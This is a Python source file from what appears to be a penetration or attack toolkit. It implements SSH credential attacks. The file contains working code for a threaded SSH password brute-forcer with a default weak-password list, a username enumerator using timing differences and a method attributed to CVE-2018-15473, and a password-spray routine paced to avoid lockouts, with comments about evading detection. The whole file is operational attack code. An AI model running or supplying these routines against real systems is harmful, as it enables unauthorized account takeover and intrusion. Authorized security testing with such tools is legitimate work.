# app/core/ssh_bruteforce_worker.py
import time
import threading
import queue
from concurrent.futures import ThreadPoolExecutor, as_completed
from .ssh_protocol import SSHProtocol
from app.core.logger import logger

class SSHBruteforceWorker:
    """SSH brute force attack implementation"""
    
    def __init__(self, max_threads=10, delay=1.0, max_attempts=100):
        self.max_threads = max_threads
        self.delay = delay
        self.max_attempts = max_attempts
        self.is_running = True
        self.successful_creds = []
        self.failed_attempts = 0
        self.total_attempts = 0
        
    def run_bruteforce(self, target, port, username, wordlist_path):
        """Run brute force attack against SSH target"""
        try:
            # Load password list
            passwords = self._load_wordlist(wordlist_path)
            if not passwords:
                return {'success': False, 'error': 'Failed to load wordlist'}
            
            # Limit attempts
            passwords = passwords[:self.max_attempts]
            self.total_attempts = len(passwords)
            
            print(f"Starting SSH brute force against {target}:{port}")
            print(f"Username: {username}")
            print(f"Passwords to try: {len(passwords)}")
            
            # Use thread pool for concurrent attempts
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                # Submit all password attempts
                future_to_password = {
                    executor.submit(self._attempt_login, target, port, username, password): password
                    for password in passwords
                }
                
                # Process results as they complete
                for future in as_completed(future_to_password):
                    if not self.is_running:
                        break
                    
                    password = future_to_password[future]
                    try:
                        result = future.result()
                        if result['success']:
                            self.successful_creds.append({
                                'username': username,
                                'password': password,
                                'target': target,
                                'port': port
                            })
                            print(f"SUCCESS: {username}:{password}")
                            
                            # Stop on first success (optional)
                            self.is_running = False
                            break
                        else:
                            self.failed_attempts += 1
                            
                    except Exception as e:
                        print(f"Error testing password {password}: {e}")
                        self.failed_attempts += 1
                    
                    # Add delay between attempts
                    if self.delay > 0:
                        time.sleep(self.delay)
            
            # Return results
            if self.successful_creds:
                return {
                    'success': True,
                    'credentials': self.successful_creds[0],
                    'total_attempts': self.failed_attempts + 1,
                    'time_taken': time.time()
                }
            else:
                return {
                    'success': False,
                    'error': 'No valid credentials found',
                    'total_attempts': self.failed_attempts,
                    'passwords_tried': len(passwords)
                }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _attempt_login(self, target, port, username, password):
        """Attempt single login"""
        try:
            ssh_protocol = SSHProtocol()
            result = ssh_protocol.authenticate_password(target, port, username, password)
            
            # Add small delay to avoid overwhelming the server
            time.sleep(0.1)
            
            return result
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _load_wordlist(self, wordlist_path):
        """Load password wordlist from file"""
        try:
            if not wordlist_path:
                # Use default common passwords
                return self._get_default_passwords()
            
            passwords = []
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password and not password.startswith('#'):
                        passwords.append(password)
            
            return passwords
            
        except Exception as e:
            print(f"Error loading wordlist: {e}")
            return self._get_default_passwords()
    
    def _get_default_passwords(self):
        """Get default password list for brute force"""
        return [
            '', 'password', '123456', 'admin', 'root', 'toor', 'pass',
            'test', 'guest', 'user', 'login', 'changeme', 'welcome',
            'qwerty', 'abc123', 'password123', 'admin123', 'root123',
            'letmein', 'monkey', 'dragon', 'master', 'shadow', 'superman',
            'michael', 'jordan', 'harley', 'ranger', 'hunter', 'buster',
            'soccer', 'hockey', 'killer', 'george', 'sexy', 'andrew',
            'charlie', 'robert', 'freedom', 'daniel', 'arsenal', 'joshua',
            'michelle', 'tigger', 'ginger', 'pepper', 'matthew', 'patrick',
            'benjamin', 'samuel', 'bradley', 'alexander'
        ]
    
    def stop(self):
        """Stop brute force attack"""
        self.is_running = False

class SSHUserEnumerator:
    """SSH username enumeration using various techniques"""
    
    def __init__(self):
        self.common_usernames = [
            'root', 'admin', 'administrator', 'user', 'test', 'guest',
            'oracle', 'postgres', 'mysql', 'www', 'ftp', 'mail', 'email',
            'web', 'www-data', 'apache', 'nginx', 'tomcat', 'jenkins',
            'git', 'svn', 'backup', 'bin', 'daemon', 'nobody', 'sshd',
            'ubuntu', 'centos', 'debian', 'redhat', 'fedora', 'suse',
            'pi', 'vagrant', 'docker', 'service', 'support', 'operator',
            'manager', 'sales', 'marketing', 'finance', 'hr', 'it',
            'dev', 'developer', 'devops', 'sysadmin', 'netadmin'
        ]
    
    def enumerate_usernames(self, target, port=22, method='timing'):
        """Enumerate valid usernames using specified method"""
        valid_usernames = []
        
        if method == 'timing':
            valid_usernames = self._timing_based_enumeration(target, port)
        elif method == 'cve_2018_15473':
            valid_usernames = self._cve_2018_15473_enumeration(target, port)
        elif method == 'response_analysis':
            valid_usernames = self._response_analysis_enumeration(target, port)
        
        return valid_usernames
    
    def _timing_based_enumeration(self, target, port):
        """Username enumeration using timing differences"""
        valid_usernames = []
        
        print(f"Starting timing-based username enumeration on {target}:{port}")
        
        for username in self.common_usernames:
            try:
                ssh_protocol = SSHProtocol()
                
                # Measure response time for invalid password
                start_time = time.time()
                result = ssh_protocol.authenticate_password(target, port, username, 'invalid_password_12345')
                end_time = time.time()
                
                response_time = end_time - start_time
                
                # Valid usernames typically take longer to process
                if response_time > 1.0:  # Threshold may need adjustment
                    valid_usernames.append(username)
                    print(f"Potential valid username: {username} (response time: {response_time:.2f}s)")
                
                # Add delay to avoid detection
                time.sleep(0.5)
                
            except Exception as e:
                print(f"Error testing username {username}: {e}")
                continue
        
        return valid_usernames
    
    def _cve_2018_15473_enumeration(self, target, port):
        """Username enumeration using CVE-2018-15473"""
        valid_usernames = []
        
        print(f"Starting CVE-2018-15473 username enumeration on {target}:{port}")
        
        for username in self.common_usernames:
            try:
                ssh_protocol = SSHProtocol()
                
                # Use timing attack method from SSH protocol
                if ssh_protocol.test_username_timing(target, port, username):
                    valid_usernames.append(username)
                    print(f"Valid username found: {username}")
                
                # Add delay
                time.sleep(0.3)
                
            except Exception as e:
                print(f"Error testing username {username}: {e}")
                continue
        
        return valid_usernames
    
    def _response_analysis_enumeration(self, target, port):
        """Username enumeration using response analysis"""
        valid_usernames = []
        baseline_responses = {}
        
        print(f"Starting response analysis username enumeration on {target}:{port}")
        
        # First, establish baseline with obviously invalid username
        try:
            ssh_protocol = SSHProtocol()
            baseline_result = ssh_protocol.authenticate_password(
                target, port, 'invalid_user_12345', 'invalid_password_12345'
            )
            baseline_responses['invalid'] = baseline_result
        except Exception as _exc:
            pass
            logger.debug("Suppressed exception", exc_info=True)
        
        # Test each username
        for username in self.common_usernames:
            try:
                ssh_protocol = SSHProtocol()
                result = ssh_protocol.authenticate_password(target, port, username, 'invalid_password_12345')
                
                # Compare response with baseline
                if self._response_differs_from_baseline(result, baseline_responses.get('invalid')):
                    valid_usernames.append(username)
                    print(f"Username response differs from baseline: {username}")
                
                time.sleep(0.4)
                
            except Exception as e:
                print(f"Error testing username {username}: {e}")
                continue
        
        return valid_usernames
    
    def _response_differs_from_baseline(self, response, baseline):
        """Check if response differs significantly from baseline"""
        if not baseline:
            return False
        
        # Compare error messages, response codes, etc.
        # This is a simplified comparison
        if response.get('error') != baseline.get('error'):
            return True
        
        return False

class SSHPasswordSpray:
    """SSH password spray attack implementation"""
    
    def __init__(self, delay=30, max_attempts_per_user=3):
        self.delay = delay  # Delay between attempts for same user
        self.max_attempts_per_user = max_attempts_per_user
        self.user_attempt_count = {}
        self.successful_creds = []
    
    def spray_passwords(self, target, port, usernames, passwords):
        """Perform password spray attack"""
        print(f"Starting password spray attack on {target}:{port}")
        print(f"Users: {len(usernames)}, Passwords: {len(passwords)}")
        
        for password in passwords:
            print(f"Trying password: {password}")
            
            for username in usernames:
                # Check attempt limit for this user
                user_key = f"{username}@{target}"
                if self.user_attempt_count.get(user_key, 0) >= self.max_attempts_per_user:
                    continue
                
                try:
                    ssh_protocol = SSHProtocol()
                    result = ssh_protocol.authenticate_password(target, port, username, password)
                    
                    # Track attempt
                    self.user_attempt_count[user_key] = self.user_attempt_count.get(user_key, 0) + 1
                    
                    if result['success']:
                        self.successful_creds.append({
                            'username': username,
                            'password': password,
                            'target': target,
                            'port': port
                        })
                        print(f"SUCCESS: {username}:{password}")
                    
                    # Add delay between attempts
                    time.sleep(2)
                    
                except Exception as e:
                    print(f"Error testing {username}:{password} - {e}")
                    continue
            
            # Longer delay between password rounds
            if password != passwords[-1]:  # Not the last password
                print(f"Waiting {self.delay} seconds before next password...")
                time.sleep(self.delay)
        
        return {
            'success': len(self.successful_creds) > 0,
            'credentials': self.successful_creds,
            'total_attempts': sum(self.user_attempt_count.values())
        }